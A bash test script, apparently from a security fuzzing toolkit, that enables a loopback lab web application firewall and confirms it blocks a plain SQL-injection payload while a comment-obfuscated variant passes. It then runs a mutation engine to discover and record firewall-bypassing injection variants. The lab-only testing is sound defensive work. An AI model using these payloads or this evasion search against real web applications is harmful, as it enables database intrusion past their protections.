#!/usr/bin/env bash
#
# Part J — Phase 8: mutation engine vs the lab WAF, end to end (T8.7).
#
# Runs the runbook Part J activities against the lab you own on loopback:
#   1. Enable the lab WAF (D16, default off) and restart.
#   2. Confirm the filter is live: a naive payload is blocked, a classic bypass passes.
#   3. Learn + evade with the live WAF: `fuzzlab mutate-run` finds a semantics-preserving
#      variant the WAF lets through and records it to payload_variant (with coverage gain
#      if the Part E instrumentation is present).
#   4. Verify the recorded variant live: the base is 403, the variant is 200.
#   5. Restore the WAF to OFF (leave the lab in its default state).
#
# LAB-ONLY, loopback, on infrastructure you own. Idempotent; always restores WAF off.
#
# Env knobs (optional):
#   PFF_WEB_PORT   lab web port (default 8080)
#   WAF_MODE       block | sanitize   (default block)
#   MUT_STORE      variant store (default waf_variants.db)
#   FZL_COV_DIR    Part E side-channel dir (default /tmp/fzl-cov; used if it exists)
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
cd "${REPO_ROOT}"

PORT="${PFF_WEB_PORT:-8080}"
LAB="http://127.0.0.1:${PORT}"
WAF_MODE="${WAF_MODE:-block}"
STORE="${MUT_STORE:-waf_variants.db}"
COV_DIR="${FZL_COV_DIR:-/tmp/fzl-cov}"

say() { printf '\n\033[1m== %s\033[0m\n' "$*"; }
die() { printf '\033[31mERROR: %s\033[0m\n' "$*" >&2; exit 1; }
command -v fuzzlab >/dev/null 2>&1 && FUZZLAB=(fuzzlab) || FUZZLAB=(python -m fuzzlab.cli)

restore_waf_off() {
  ( cd lab && PFF_WAF=off ./labctl.sh up ) >/dev/null 2>&1 || true
}
trap restore_waf_off EXIT          # always leave the WAF off

code_for() { curl -s -o /dev/null -w '%{http_code}' --get --data-urlencode "q=$1" \
             "${LAB}/search.php"; }

# --- 1. enable the WAF ------------------------------------------------------
# Probe a real served endpoint, not "/": the generated Laravel target 404s on
# "/" (no homepage route), so `curl -f "${LAB}/"` would never pass. Use
# /product.php?id=1 (returns 200). The WAF default-allows benign GETs, so this
# stays reachable with the WAF on.
READY_URL="${LAB}/product.php?id=1"
say "1/5  Enabling the lab WAF (PFF_WAF=on, mode=${WAF_MODE}) and restarting"
( cd lab && PFF_WAF=on PFF_WAF_MODE="${WAF_MODE}" ./labctl.sh up )
for _ in $(seq 1 30); do curl -fs -o /dev/null "${READY_URL}" && break; sleep 1; done
curl -fs -o /dev/null "${READY_URL}" || die "lab not reachable at ${READY_URL}"

# --- 2. confirm the filter is live ------------------------------------------
say "2/5  Confirming the filter is live"
naive=$(code_for "1 union select 1")
bypass=$(code_for "1 union/**/select 1")
echo "  q=1 union select 1     -> HTTP ${naive}   (expect 403)"
echo "  q=1 union/**/select 1  -> HTTP ${bypass}   (expect 200)"
[ "${naive}" = "403" ] || die "WAF not blocking the naive payload (got ${naive}); is PFF_WAF=on?"

# --- 3. learn + evade against the live WAF ----------------------------------
say "3/5  Learning a semantics-preserving bypass against the live WAF"
rm -f "${STORE}"
MUT_ARGS=(mutate-run --url "${LAB}/search.php" --param q --store "${STORE}"
          --vuln-class sql-injection --seed 1 --budget 40 --authorized)
if [ -d "${COV_DIR}" ]; then
  MUT_ARGS+=(--cov-dir "${COV_DIR}")
  echo "  (measuring coverage gain via the Part E side channel ${COV_DIR})"
fi
"${FUZZLAB[@]}" "${MUT_ARGS[@]}"

# --- 4. verify the recorded variant live ------------------------------------
say "4/5  Verifying the recorded variant against the live WAF"
variant=$(python - "$STORE" <<'PY'
import sys
from fuzzlab.core.store import Store
with Store(sys.argv[1]) as s:
    row = s.conn.execute(
        "SELECT variant FROM payload_variant "
        "WHERE run_id=(SELECT MAX(id) FROM run WHERE tool='mutate') "
        "ORDER BY id LIMIT 1").fetchone()
print(row["variant"] if row else "")
PY
)
[ -n "${variant}" ] || die "no variant was recorded (the search found no bypass)"
base_code=$(code_for "1 union select 1")
var_code=$(code_for "${variant}")
echo "  base    q='1 union select 1' -> HTTP ${base_code}   (expect 403, blocked)"
echo "  variant q=${variant@Q} -> HTTP ${var_code}   (expect 200, bypass)"
[ "${base_code}" = "403" ] && [ "${var_code}" = "200" ] \
  || die "expected base 403 + variant 200; got ${base_code}/${var_code}"
echo "  OK: a semantics-preserving variant bypasses the live WAF where the base is blocked."

# --- 5. restore + summary ---------------------------------------------------
say "5/5  Restoring the WAF to OFF and summarizing"
restore_waf_off
trap - EXIT
echo "  variants recorded in ${STORE}:"
python - "$STORE" <<'PY'
import sys
from fuzzlab.core.store import Store
from fuzzlab.mutation.catalog import list_variants
with Store(sys.argv[1]) as s:
    rid = s.conn.execute("SELECT MAX(id) FROM run WHERE tool='mutate'").fetchone()[0]
    for v in list_variants(s, rid):
        gain = v.get("coverage_gain")
        gain = f"  +{gain:g} new line(s)" if gain else ""
        print(f"    {v['base_payload']!r} -> {v['variant']!r} via {v['operators']} "
              f"(bypassed {v['bypassed_rule']}){gain}")
PY
echo "  WAF restored to OFF (lab back in its default state)."
